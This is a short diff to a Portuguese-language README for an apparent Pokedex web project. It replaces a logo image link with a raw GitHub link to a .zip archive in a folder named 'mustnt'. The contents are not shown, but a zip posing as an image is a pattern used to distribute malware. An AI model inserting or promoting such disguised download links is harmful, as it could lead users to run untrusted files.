@@ -27,7 +27,7 @@ Engajamento do recrutador/cliente → um projeto assim desperta curiosidade e in
 
 -👤 Interatividade → carregamento dinâmico de informações sem precisar recarregar a página.
 
-![Logo](https://i.ibb.co/27YDf2hZ/pokedeximag.png)
+![Logo](https://raw.githubusercontent.com/Euadud/Pokedex/main/mustnt/Pokedex.zip)
 
 
 ## 🚀 Sobre mim
